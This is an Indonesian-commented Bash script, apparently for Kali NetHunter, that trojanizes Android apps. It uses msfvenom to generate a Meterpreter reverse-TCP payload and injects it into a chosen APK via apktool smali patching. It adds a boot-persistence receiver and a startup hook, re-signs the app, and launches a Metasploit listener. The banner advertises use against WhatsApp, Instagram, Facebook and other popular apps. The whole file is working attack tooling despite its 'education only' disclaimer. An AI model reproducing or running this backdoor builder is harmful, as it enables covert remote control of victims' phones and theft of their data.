# !/bin/bash
# code by K1M4K-ID
# ./msploit adalah sebuah tools adaptasi dari evil-droid. khusus pengguna nethunter mobile
# jika device mu menggunakan desktop gunakan script GreenHatArsenal-Toolkit
# source : https://github.com/K1M4K-ID/GreenHatArsenal-Toolkit
# gunakan script ini dengan bijak, jangan gunakan tools ini untuk melakukan tindak kejahatan
# author tidak akan bertanggung jawab atas perbuatan kalian.!!
# gunakan tools ini untuk edukasi.. atau pendidikan semata.! semoga tools ini dapat membantu!
# code warna
RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
ORANGE="$(printf '\033[33m')"
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
BLACK="$(printf '\033[30m')"
BLACKBG="$(printf '\033[40m')"
RESETFG="$(printf '\e033[0m')"
RESETBG="$(printf '\e[0m\n')"
YELLOW="$(printf '\e[1;33m')"
# config ip address
eth0_ip=$(ifconfig eth0 | grep "inet" | awk 'NR == 1 {print $2}')
wlan0_ip=$(ifconfig wlan0 | grep "inet" | awk 'NR == 1 {print $2}')
# patch directory saat ini
path=$(pwd)
# logo
function baner() {
cat <<- EOF
 ${GREEN}__    __     ______     ______   __         ______     __     ______  
/\ "-./  \   /\  ___\   /\  == \ /\ \       /\  __ \   /\ \   /\__  _\ 
\ \ \-./\ \  \ \___  \  \ \  _-/ \ \ \____  \ \ \/\ \  \ \ \  \/_/\ \/ 
${WHITE} \ \_\ \ \_\  \/\_____\  \ \_\    \ \_____\  \ \_____\  \ \_\    \ \_\ 
  \/_/  \/_/   \/_____/   \/_/     \/_____/   \/_____/   \/_/     \/_/ 
                                                                       
                             ${BLUE}./Inject.sh
                   ${GREEN}Tested, Whatsapp, Instagram, Fb
            ${YELLOW}Tiktok, Telegram, Line, Twitter, Mobile Legend
                     ${WHITE}Version 1.1 Copyright @K1M4K-ID
                  ${BLUE}Github : https://github.com/K1M4K-ID
                             YT : K1M4K-ID


EOF
  #statements
}
# check folder malware jika ada maka akan sleep 1 menit
if [ -d "Malware" ];
then
	sleep 0.1
else
	mkdir -p Malware
fi
# bersih layar dan tampilkan banner
clear
baner
printf "\033[31;1m[\033[34;1m*\033[31;1m]\033[37;1m please wait . . . .\n\n"
# input aplikasi yang ingin di injeksi
function xyz()
{
 read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] patch aplikasi>"'\033[34;1m')" aps
}
# setup ip,nama,
function sets_apsinal(){
        clear
        baner
        printf '\033[31;1m'
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] sekarang masukan ip untuk backdoor anda\033[31;1m\n"
        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1m$eth0_ip\033[37;1m)\033[31;1m\n"
        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1m$wlan0_ip\033[37;1m)\033[31;1m\n"
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] lhost>"'\033[34;1m')" lh
        printf '\033[31;1m'
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] lport>"'\033[34;1m')" lp
        printf '\033[31;1m'
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] output[example:fbmod]>"'\033[34;1m')" nama
        printf '\033[31;1m'
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . . please wait\033[31;1m\n"
        printf '\033[31;1m\n'
}
# buat inject payload method baru... tidak semua bisa!
function inject_payloads(){
        msfvenom -x $aps -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/$nama.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        echo
}
# buat payload
function inject_payload(){
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        echo
}
# listerner
function listener_kali(){
        clear
        baner
        printf "\033[37;1m[\033[32;1m*\033[37;1m] local ip address anda, eth0  (\033[31;1m$eth0_ip\033[37;1m)\033[31;1m\n"
        printf "\033[37;1m\n[\033[32;1m*\033[37;1m] local ip address anda, wlan0 (\033[31;1m$wlan0_ip\033[37;1m)\033[31;1m\n"
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] lhost>"'\033[34;1m')" lh
        printf '\033[31;1m'
        read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] lport>"'\033[34;1m')" lp
        printf '\033[31;1m'
        sleep 1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] starting metasploit listener . . .\033[31;1m\n"
        sleep 2
        clear
}
# menu listernet
function listerners(){
    clear
    baner
    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1mlisterner\033[32;1m android\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1mx\033[31;1m] \033[37;1mexit\033[31;1m\n\n"
    sleep 0.025
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice>"'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    echo
    if [ $xyz = "1"  ];
    then
    listener_kali
	msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST $lh;set LPORT $lp;exploit;"
	clear
	listerners

	elif [ $xyz = "2"  ];
	then
	menu

	elif [ $xyz = "x"  ];
	then
	exit;

	else
        printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
	sleep 2
	clear
	listerners

	fi
}
# decompyle payload
#
function decompile_payload(){
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompile payload.apk\033[31;1m\n"
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
         apktool d -f $path/payload.apk
}
# decompile apsinal
#
function decompile_apsinal(){
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompile $aps\033[31;1m\n"
         apktool d -f -o $path/apsinal $aps
}
# rebuild payload apsinal
#
function rebuild_apsinal(){
	printf '\033[31;1m'
        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild backdoor please wait..\033[31;1m\n"
         apktool b $path/apsinal -o ori.apk
}
# add permission dan hook
#
function perms()
{
 printf $ku""
 printf "\033[37;1m[\033[32;1m*\033[37;1m] menambahkan permission and hook smali\033[31;1m\n"
 package_name=`head -n 2 $path/apsinal/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
 package_dash=`head -n 2 $path/apsinal/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
 tmp=$package_name
 sed -i "5i\ $perms" $path/apsinal/AndroidManifest.xml
 rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
 sed -i "s|Lcom/metasploit|L$package_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
 cp -r $path/payload/smali/com/metasploit/stage $path/apsinal/smali/$package_name > /dev/null 2>&1
 rc=$?
 if [ $rc != 0 ];then
  app_name=`grep "<application" $path/apsinal/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
  app_dash=`grep "<application" $path/apsinal/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
  tmp=$app_name
  sed -i "s|L$package_name|L$app_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
  cp -r $path/payload/smali/com/metasploit/stage $path/apsinal/smali/$app_name > /dev/null 2>&1
  amanifest="    </application>"
  boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'
  sed -i "s|$amanifest|$boot_cmp|g" $path/apsinal/AndroidManifest.xml 2>&1
 fi
 amanifest="    </application>"
 boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'
 sed -i "s|$amanifest|$boot_cmp|g" $path/apsinal/AndroidManifest.xml 2>&1
 android_nam=$tmp
}
# functions hook smali
#
function hook_smalies()
{
 launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/apsinal/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
 android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/apsinal/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/apsinal/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/apsinal/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 if [ $android_name ]; then
  printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  printf "\033[37;1minject Smali>$android_name.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/apsinal/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  printf "\033[37;1mbaris ke>$hook_num \n"
  printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/apsinal/smali/$android_name.smali > /dev/null 2>&1
 elif [ ! -e $android_activity ]; then
  printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  printf "\033[37;1minject Smali>$android_activity.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/apsinal/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  printf "\033[37;1mbaris ke>$hook_num \n"
  printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/apsinal/smali/$android_activity.smali > /dev/null 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    printf '\033[31;1m'
    
    printf "\n\033[37;1m[\033[31;1mx\033[37;1m] tidak ditemukan>$android_activity.smali\n"
    printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba lagi . . .\033[31;1m\n"
    
    sleep 2
    echo
    printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
    printf "\033[37;1minject Smali>$android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
    hook_num=`grep -n "    return-void" $path/apsinal/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
    printf "\033[37;1mbaris ke>$hook_num \n"
    printf "\033[32;1m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
    starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
    sed -i "${hook_num}i\ ${starter}" $path/apsinal/smali/$android_targetActivity.smali > /dev/null 2>&1
  fi
 fi
}
# hapus sampah..
function clear_data(){
        rm -fr ori.apk payload payload.apk apsinal && mv $nama.apk Malware
}
# sign backdoor file manual inject
#
function sign_aps(){
        printf "\033[37;1m[\033[32;1m*\033[37;1m] memeriksa .android/key.keystore untuk penandatanganan\033[31;1m\n"
if [ ! -f .android/key.keystore ]; then
        printf "\033[37;1m[\033[31;1mx\033[37;1m] Kunci debug tidak ditemukan. membuatnya sekarang\033[31;1m\n"
        if [ ! -d ".android"  ]; then
        mkdir .android > /dev/null
        fi
        keytool -genkey -v -keystore .android/key.keystore -storepass android -alias key -keypass android -keyalg RSA -keysize 2048 -validity 10000
fi
        printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba menandatangani paket dengan kunci android anda\033[31;1m\n"
        jarsigner -keystore .android/key.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA ori.apk key > /dev/null 2>&1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] menandatangani aplikasi backdoor anda,\033[32;1m succesfully\033[31;1m\n"
        printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba memverifikasi aplikasi backdoor anda, please wait\033[31;1m\n"
        jarsigner -verify -verbose -certs ori.apk.apk > /dev/null 2>&1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] mengkompilasi ulang aplikasi\033[31;1m\n"
        zipalign -p 4 ori.apk $nama.apk > /dev/null 2>&1
        zipalign -c 4 $nama.apk > /dev/null 2>&1
        printf "\033[37;1m[\033[32;1m*\033[37;1m] verifikasi aplikasi backdoor anda,\033[32;1m succesfully\033[31;1m\n"
}
# runer program
function backdoor_file(){
        sets_apsinal
        inject_payload
        xyz
        decompile_payload
        decompile_apsinal
        perms
        hook_smalies
        sleep 1
        rebuild_apsinal
        sleep 1
        sign_aps
        sleep 1
        clear_data
        sleep 1
}
# start program
function run(){
sets_apsinal
xyz
inject_payloads
read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] ENTER TO CONTINUE "'\033[34;1m')" lan
listerners
}
# recomendasi inject backdoor V.2
function menu(){
    clear
    baner
    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1minject backdoor android\033[37;1m [\033[31;1mV.1\033[37;1m]\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1minject backdoor android\033[37;1m [\033[31;1mV.2\033[37;1m]\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1mX\033[31;1m] \033[37;1mexit\033[31;1m\n\n"
    sleep 0.025
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice>"'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    echo
    if [ $xyz = "1"  ];
    then
	run
	listerners

    elif [ $xyz = "2"  ];
	then
	backdoor_file
    echo ""
    read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] ENTER TO CONTINUE "'\033[34;1m')" lan
    listerners

	elif [ $xyz = "x"  ];
	then
	exit;

	else
    printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
	sleep 2
	clear
	menu

	fi
}
menu
